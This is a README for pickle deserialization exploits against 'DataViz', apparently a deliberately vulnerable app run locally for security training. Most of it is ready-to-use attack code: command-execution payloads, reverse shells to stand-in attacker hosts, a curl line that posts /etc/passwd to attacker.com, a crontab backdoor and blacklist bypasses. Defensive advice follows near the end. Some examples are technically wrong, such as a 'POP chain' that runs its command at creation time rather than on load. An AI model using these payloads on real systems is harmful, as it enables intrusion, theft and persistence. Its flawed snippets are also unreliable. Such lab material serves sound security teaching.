# DataViz - Deserialization Exploits

## Overview
These exploits target Python pickle deserialization vulnerabilities in the DataViz application's chart state loading feature.

## Target Application
- **Project**: DataViz
- **Port**: 5002
- **Vulnerable Feature**: Chart state save/load using pickle
- **Vulnerability**: Unsafe `pickle.loads()` on user-controlled data

## Prerequisites
```bash
# Ensure DataViz is running
docker-compose up -d dataviz
curl http://localhost:5002
```

## Exploits

### 1. pickle_advanced.py
Advanced pickle deserialization exploit with custom gadget chains.

**Usage:**
```bash
python3 pickle_advanced.py
```

**What it does:**
- Creates malicious pickle payload with custom `__reduce__` method
- Exploits pickle's automatic code execution during deserialization
- Uses Python gadget chains to achieve RCE
- Can execute arbitrary system commands

**Expected Output:**
```
[+] Targeting: http://localhost:5002/load_chart
[+] Creating malicious pickle payload...
[+] Payload will execute: cat /etc/passwd
[+] Sending serialized object...
[+] Deserialization triggered!
[+] Command output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 2. pickle_gadgets.py
Exploits using pre-built pickle gadget chains from common libraries.

**Usage:**
```bash
python3 pickle_gadgets.py
```

**What it does:**
- Leverages gadgets from libraries like `subprocess`, `os`, `socket`
- Chains multiple objects to achieve complex execution
- Demonstrates various attack techniques
- Can establish reverse shells

**Expected Output:**
```
[+] Building gadget chain...
[+] Using subprocess.Popen gadget
[+] Target: http://localhost:5002/load_chart
[+] Sending payload...
[+] Success! Reverse shell established on port 4444
```

## Understanding Pickle Vulnerabilities

### Why Pickle is Dangerous:
```python
import pickle

# Malicious class
class Evil:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

# Serialize
malicious_data = pickle.dumps(Evil())

# When victim deserializes, __reduce__ executes!
pickle.loads(malicious_data)  # Runs 'whoami'
```

### The __reduce__ Method:
```python
class RCE:
    def __reduce__(self):
        import subprocess
        cmd = ['nc', '-e', '/bin/bash', 'attacker.com', '4444']
        return (subprocess.Popen, (cmd,))
```

## Attack Payloads

### 1. Basic Command Execution
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
```

### 2. Reverse Shell
```python
import pickle
import subprocess

class ReverseShell:
    def __reduce__(self):
        cmd = 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
        return (subprocess.Popen, 
                (['/bin/bash', '-c', cmd],))

payload = pickle.dumps(ReverseShell())
```

### 3. File Exfiltration
```python
import pickle
import subprocess

class ExfilData:
    def __reduce__(self):
        cmd = 'curl -X POST -d @/etc/passwd http://attacker.com/steal'
        return (subprocess.Popen, 
                (['/bin/bash', '-c', cmd],))

payload = pickle.dumps(ExfilData())
```

### 4. Persistence (Backdoor)
```python
import pickle
import subprocess

class Persistence:
    def __reduce__(self):
        # Add cron job for reverse shell
        cmd = 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER/4444 0>&1\'" | crontab -'
        return (subprocess.Popen, (['/bin/bash', '-c', cmd],))

payload = pickle.dumps(Persistence())
```

## Manual Testing

### Generate Payload:
```python
# create_payload.py
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('cat /etc/passwd',))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### Send via curl:
```bash
# Generate payload
PAYLOAD=$(python3 create_payload.py)

# Send to vulnerable endpoint
curl -X POST http://localhost:5002/load_chart \
  -H "Content-Type: application/json" \
  -d "{\"chart_state\":\"$PAYLOAD\"}"
```

### Via Web Interface:
1. Save a chart state (to see the format)
2. Capture the pickled data from network tab
3. Replace with malicious pickle payload
4. Load the "chart" to trigger deserialization

## Advanced Techniques

### 1. Using POP Chains (Property-Oriented Programming)
```python
# Similar to ROP but for Python objects
import pickle

class Stage1:
    def __init__(self):
        self.next = Stage2()
    
class Stage2:
    def __init__(self):
        import os
        os.system('whoami')

payload = pickle.dumps(Stage1())
```

### 2. Bypassing Blacklists
```python
# If 'os' is blacklisted
class Bypass:
    def __reduce__(self):
        # Import using __import__
        return (__import__('os').system, ('id',))

# Or use subprocess instead
class Bypass2:
    def __reduce__(self):
        from subprocess import call
        return (call, (['whoami'],))
```

### 3. Pickle Injection Tools
```bash
# Use pickle-injector tool
python3 pickle_injector.py --target http://localhost:5002/load_chart \
                           --command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

## Defense Recommendations

### 1. NEVER Use Pickle for Untrusted Data
```python
# DON'T DO THIS:
chart_data = pickle.loads(user_input)  # NEVER!

# DO THIS INSTEAD:
import json
chart_data = json.loads(user_input)  # Safe
```

### 2. Use Safe Serialization Formats
```python
# JSON (safest for data)
import json
data = json.dumps({'chart': 'data'})
loaded = json.loads(data)

# YAML (with SafeLoader)
import yaml
data = yaml.dump({'chart': 'data'})
loaded = yaml.safe_load(data)  # Use safe_load!

# MessagePack (binary, safe)
import msgpack
data = msgpack.packb({'chart': 'data'})
loaded = msgpack.unpackb(data)
```

### 3. Sign Pickled Data (If You Must Use It)
```python
import pickle
import hmac
import hashlib

SECRET_KEY = 'your-secret-key'

def safe_pickle_dumps(obj):
    pickled = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY.encode(), pickled, hashlib.sha256).digest()
    return signature + pickled

def safe_pickle_loads(data):
    signature = data[:32]
    pickled = data[32:]
    
    expected = hmac.new(SECRET_KEY.encode(), pickled, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
    
    return pickle.loads(pickled)
```

### 4. Restrict Pickle Loading
```python
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow specific safe classes
        safe_modules = {
            'builtins': ['list', 'dict', 'str', 'int', 'float'],
            'collections': ['OrderedDict'],
        }
        
        if module in safe_modules and name in safe_modules[module]:
            return super().find_class(module, name)
        
        raise pickle.UnpicklingError(f"Unsafe class: {module}.{name}")

def restricted_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

## Detection and Monitoring

### Log Suspicious Deserialization:
```python
import logging

def monitored_pickle_loads(data):
    logging.warning(f"Pickle deserialization attempted: {len(data)} bytes")
    logging.warning(f"First 100 bytes: {data[:100]}")
    
    # Check for suspicious opcodes
    if b'R' in data or b'i' in data or b'c' in data:
        logging.error("Suspicious pickle opcodes detected!")
    
    return pickle.loads(data)
```

## Notes
**CRITICAL WARNING**: Pickle deserialization is extremely dangerous
- Allows arbitrary code execution
- No safe way to unpickle untrusted data
- Always use JSON or other safe formats instead
- Pickle should ONLY be used for trusted, internal data

**Attack Impact:**
- Complete server compromise
- Data theft
- Lateral movement
- Persistent backdoors
- Supply chain attacks (if pickled libraries are poisoned)

## Related Exploits
- See `../rce/` for direct RCE techniques
- See `../ssrf/` for combining with SSRF attacks
- After exploiting pickle, use RCE exploits for further access

## References
- https://davidhamann.de/2020/04/05/exploiting-python-pickle/
- https://github.com/trailofbits/fickling
- https://intoli.com/blog/dangerous-pickles/
